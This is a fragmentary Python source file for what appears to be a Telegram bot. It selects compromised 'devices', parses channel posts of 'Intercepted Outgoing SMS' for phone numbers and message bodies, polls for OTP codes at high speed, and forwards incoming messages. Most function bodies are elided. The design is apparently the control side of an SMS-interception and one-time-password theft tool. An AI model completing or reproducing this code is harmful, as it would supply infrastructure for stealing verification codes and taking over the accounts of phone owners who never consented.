...
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text("<b>📱 Select your device:</b>", parse_mode="HTML", reply_markup=reply_markup)
...
# ============================
# SEND SMS + CONFIRMATION (SPEED BOOST)
# ============================
...
# ============================
# CHANNEL MESSAGE HANDLER (DONO FORMAT SUPPORT)
# ============================
...
async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # FORMAT 1: Purana format (To: / Message:)
    number_match = re.search(r"To:\s*([\d\+]+)", text)
    message_match = re.search(r"Message:\s*(.+)", text)
    
    # FORMAT 2: Naya format (📱 Intercepted Outgoing SMS)
    if not number_match:
        number_match = re.search(r"To \(Tap to copy\):\s*([\d\+]+)", text)
    if not message_match:
        message_match = re.search(r"Body \(Tap to copy\):\s*(.+)", text)
...
def poll_otp_updates():
    while True:
        ...
        time.sleep(0.1)  # Speed boost

# ============================
# INCOMING MESSAGE FORWARD (SPEED BOOST)
# ============================
